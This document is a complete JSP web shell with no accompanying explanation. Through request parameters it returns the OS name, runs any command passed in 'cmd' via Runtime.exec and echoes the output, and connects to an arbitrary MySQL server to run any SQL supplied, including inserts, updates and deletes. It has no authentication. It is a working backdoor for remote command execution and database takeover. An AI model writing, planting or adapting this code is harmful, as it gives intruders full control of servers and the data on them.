<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%
	String key = "key";
	String act = request.getParameter(key);
	response.setContentType("text/html;charset=UTF-8");
	if (act.equals("uname")) {
		out.print(System.getProperty("os.name"));
	}

	if (act.equals("shell")) {
		try {
			String cmd = request.getParameter("cmd");
			Process child = Runtime.getRuntime().exec(cmd);
			InputStream in = child.getInputStream();
			int c;
			while ((c = in.read()) != -1) {
				out.print((char) c);
			}
			in.close();
			try {
				child.waitFor();
			} catch (InterruptedException e) {
				out.print(e);
			}
		} catch (IOException e) {
			out.print(e);
		}
	}

	if (act.equals("databaseconnect")) {

		Connection conn = null;
		String database_ = request.getParameter("database");
		String url = "jdbc:mysql://" + request.getParameter("sqlAddress") + ":3306/" + database_;
		String user = request.getParameter("user");
		String password = request.getParameter("password");
		//加载驱动包
		Class.forName("com.mysql.jdbc.Driver");
		//获取连接对象

		try {
			conn = (Connection) DriverManager.getConnection(url, user, password);
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		PreparedStatement ptmt = conn.prepareStatement(request.getParameter("sql"));
		ResultSet rs = ptmt.executeQuery(request.getParameter("sql"));
		ResultSetMetaData rsmd = rs.getMetaData();
		if (request.getParameter("type").equals("insert")||
				request.getParameter("type").equals("update")||
				request.getParameter("type").equals("delete")) {
			int row = ptmt.executeUpdate();
			if (row == 0) {
				out.print("false");
				throw new RuntimeException();// 出错抛异常
			} else {
				out.print("done");
			}
		} else {
			try {
				ResultSet set = ptmt.executeQuery();
				for (int i = 0; i < rsmd.getColumnCount(); i++) {
					out.print(rsmd.getColumnName(i + 1) + "\t|\t");
				}
				out.print("\n------------------------------------------------------\n");
				while (set.next()) {
					for (int i = 0; i < rsmd.getColumnCount(); i++) {
						out.print(set.getString(i + 1) + "\t|\t");
					}
					out.print("\n");
				}
			} catch (SQLException e) {
			}
		}
		if (conn != null) {
			conn.close();
		}
	}

	if (act.equals("")) {
		out.print("");
	}

	if (act.equals("")) {
		out.print("");
	}

	if (act.equals("")) {
		out.print("");
	}

	if (act.equals("")) {
		out.print("");
	}
%>